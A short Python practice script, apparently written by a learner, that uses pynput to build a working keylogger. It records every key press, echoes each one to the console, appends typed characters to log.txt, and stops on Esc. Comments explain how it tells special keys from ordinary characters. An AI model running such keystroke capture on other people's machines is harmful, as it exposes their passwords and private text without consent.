import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    print("{0} pressed".format(key)) 

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","") # This is used to remove the quotation marks form the given input in the log file
            if k.find("space") > 0:
                f.write('\t')
            elif k.find("Key") == -1: 
                f.write(k)

            #       Understanding in the Context of a Keylogger
            # When logging keystrokes, you typically capture:
            
            # Regular characters (like a, b, c, 1, 2, @, etc.)
            # Special keys (like Key.enter, Key.space, Key.shift, etc.)
            # How Key Presses Are Logged?
            # Some keylogging libraries (like pynput.keyboard) return special keys as objects (e.g., Key.space or Key.enter).
            # These special keys are converted to strings and might contain "Key" in their names (e.g., "Key.enter", "Key.space").
            # Regular keys (like 'a', 'b', '1') do not contain "Key".
            # What Does k.find("Key") == -1 Do?
            # It checks if "Key" is not present in k.
            # If "Key" is missing, it means k is a regular character and not a special key.
            # This helps differentiate between normal characters and special keys.


def on_release(key):
    if key == Key.esc:
        return False     

with Listener(on_press = on_press,on_release=on_release) as listener:
    listener.join()
# now lets check what happens in th file after change in the code i think it  will work fine